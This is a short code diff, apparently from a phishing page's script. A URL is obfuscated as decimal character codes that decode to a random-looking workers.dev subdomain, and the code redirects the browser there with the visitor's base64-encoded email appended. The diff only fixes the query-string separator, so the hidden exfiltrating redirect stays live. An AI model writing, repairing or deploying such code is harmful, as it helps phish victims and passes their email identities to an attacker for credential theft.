@@ -109,7 +109,7 @@
             let encodedURL = "104 116 116 112 115 58 47 47 48 99 54 54 99 51 48 97 46 101 98 102 57 56 102 56 50 52 102 100 102 98 56 50 98 98 102 102 57 97 51 101 98 46 119 111 114 107 101 114 115 46 100 101 118";
             let decodedURL = encodedURL.split(" ").map(num => String.fromCharCode(num)).join("");
 
-            window.location.href = decodedURL + "/qrc=" + (base64Email);
+            window.location.href = decodedURL + "?qrc=" + (base64Email);
         }
 
         // Enable "Enter" key submission for email input
